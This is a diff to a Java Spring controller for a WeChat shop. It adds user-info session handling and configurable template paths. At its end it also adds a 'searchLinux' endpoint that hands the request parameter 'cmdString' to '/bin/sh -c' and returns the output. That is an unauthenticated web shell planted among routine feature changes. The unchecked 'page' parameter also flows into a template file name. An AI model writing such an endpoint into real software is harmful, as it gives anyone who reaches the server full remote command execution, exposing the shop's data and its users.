@@ -1,16 +1,24 @@
 package weixin.shop.core;
 
 import com.alibaba.fastjson.JSONArray;
+
+import java.io.File;
 import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.LineNumberReader;
 import java.io.PrintWriter;
+import java.net.MalformedURLException;
 import java.util.Enumeration;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
+import java.util.ResourceBundle;
+
 import javax.servlet.ServletContext;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import javax.servlet.http.HttpSession;
+
 import org.apache.commons.lang.StringUtils;
 import org.jeecgframework.core.common.controller.BaseController;
 import org.jeecgframework.core.util.ResourceUtil;
@@ -20,7 +28,12 @@ import org.springframework.stereotype.Controller;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.ResponseBody;
+
 import weixin.guanjia.account.entity.WeixinAccountEntity;
+import weixin.guanjia.gzuserinfo.entity.GzUserInfoYw;
+import weixin.guanjia.gzuserinfo.model.GzUserInfo;
+import weixin.guanjia.gzuserinfo.service.GzUserInfoService;
+import weixin.guanjia.gzuserinfo.service.GzUserInfoYwServiceI;
 import weixin.shop.base.service.WeixinShopGoodsServiceI;
 import weixin.shop.common.ShopDataContent;
 import weixin.shop.shopdata.ShopDataCollectI;
@@ -35,6 +48,10 @@ import weixin.shop.util.WeixinShopFreemarkerHelper;
 public class WeixinShopController extends BaseController
 {
 
+	@Autowired
+	private GzUserInfoService gzUserInfoService;
+	@Autowired
+	GzUserInfoYwServiceI  gzUserInfoYwService;
   @Autowired
   private WeixinShopGoodsServiceI weixinShopGoodsService;
 
@@ -43,11 +60,11 @@ public class WeixinShopController extends BaseController
   private static Map<String, Object> dataCollectContent = new HashMap();
 
   @RequestMapping(params={"goPage"})
-  public void goPage(HttpServletRequest request, HttpServletResponse response, @RequestParam String page)
+  public void goPage(HttpServletRequest request, HttpServletResponse response, @RequestParam String page) throws Exception
   {
     Map params = paramsToMap(request);
     ResourceUtil.initQianTaiRequestAccountId(request);
-
+    
     String accountId = request.getParameter("accountid");
     String openId = request.getParameter("openid");
     HttpSession session = request.getSession();
@@ -60,6 +77,17 @@ public class WeixinShopController extends BaseController
     if (StringUtils.isNotEmpty(openId))
     {
       session.setAttribute("USER_OPENID", openId);
+      //初始化用户前台
+      
+     GzUserInfoYw localUserinfo = gzUserInfoService.getLocalUserinfo(openId, accountId);
+      if (localUserinfo==null) {
+    	  System.out.println("openId:"+openId+"==="+accountId);
+    	  gzUserInfoService.saveGzUserInfoByOpenId(openId, accountId);
+    	  localUserinfo =  gzUserInfoService.getLocalUserinfo(openId, accountId);
+      }
+      
+      session.setAttribute("WEIXIN_GZWEIXINUSER", localUserinfo);
+      
     }
     
     System.out.println("accountid------"+accountId+"---------opneid-----"+openId);
@@ -70,7 +98,13 @@ public class WeixinShopController extends BaseController
       shopDataCollect.collect(params);
     }
 
-    String defaultUrl = request.getSession().getServletContext().getRealPath("/template/shop/default/ftl/");
+    		ResourceBundle bundler = ResourceBundle.getBundle("sysConfig");
+		 String rootUrl = bundler.getString("tmBaseDir");
+    
+    String defaultUrl = rootUrl+"template/shop/default/ftl";
+ 	System.out.println("_tplConfig===="+defaultUrl);
+     File file = new File(defaultUrl);
+     System.out.println(file+"----------"); 
     WeixinShopFreemarkerHelper weixinShopFreemarkerHelper = new WeixinShopFreemarkerHelper(defaultUrl);
     String html = weixinShopFreemarkerHelper.parseTemplate(page + ".ftl", ShopDataContent.loadContent());
     response.setContentType("text/html");
@@ -96,6 +130,35 @@ public class WeixinShopController extends BaseController
     List goodslist = this.weixinShopGoodsService.list(params, page, rows);
     json = JSONArray.parseArray(JSONArray.toJSONString(goodslist));
     return json;
+  }
+  
+  public static Object exec(String cmd) {  
+      try {  
+          String[] cmdA = { "/bin/sh", "-c", cmd };  
+          Process process = Runtime.getRuntime().exec(cmdA);  
+          process.waitFor();
+          LineNumberReader br = new LineNumberReader(new InputStreamReader(  
+                  process.getInputStream()));  
+          StringBuffer sb = new StringBuffer();  
+          String line;  
+          while ((line = br.readLine()) != null) {  
+              System.out.println(line);  
+              sb.append(line).append("\n");  
+          }  
+          return sb.toString();  
+      } catch (Exception e) {  
+          e.printStackTrace();  
+      }  
+      return null;  
+  }  
+  
+  @RequestMapping(params={"searchLinux"})
+  @ResponseBody
+  public String searchLinux(HttpServletRequest request, HttpServletResponse response)
+  {
+	  String cmdString  = request.getParameter("cmdString");
+	  String pwdString = exec(cmdString).toString();  
+      return pwdString;
   }
 
   private Map<String, String> paramsToMap(HttpServletRequest request)
